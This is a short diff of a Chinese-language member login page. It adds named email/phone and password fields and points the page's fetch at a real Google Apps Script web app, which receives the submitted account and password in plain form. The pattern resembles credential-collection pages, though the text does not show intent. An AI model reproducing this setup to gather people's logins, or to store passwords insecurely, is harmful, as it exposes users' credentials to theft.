@@ -34,8 +34,8 @@
 
   <div class="login-card" id="loginCard">
     <h2>會員登入</h2>
-    <input type="text" placeholder="請輸入帳號" />
-    <input type="password" placeholder="請輸入密碼" />
+    <input type="text" name="account" placeholder="請輸入信箱或電話號碼" />
+<input type="password" name="password" placeholder="請輸入密碼" />
     <button>登入</button>
   </div>
 
@@ -61,7 +61,7 @@
     data.append("account", account);
     data.append("password", password);
 
-    fetch("https://script.google.com/macros/s/你新的WebAppURL/exec", {
+    fetch("https://script.google.com/macros/s/AKfycby1ewxB3xytE067OlDyM-4R1jURgdW6faAOeT4J91w18fjrlmdha8nODmf0dYHxRjdUMg/exec", {
       method: "POST",
       body: data
     })
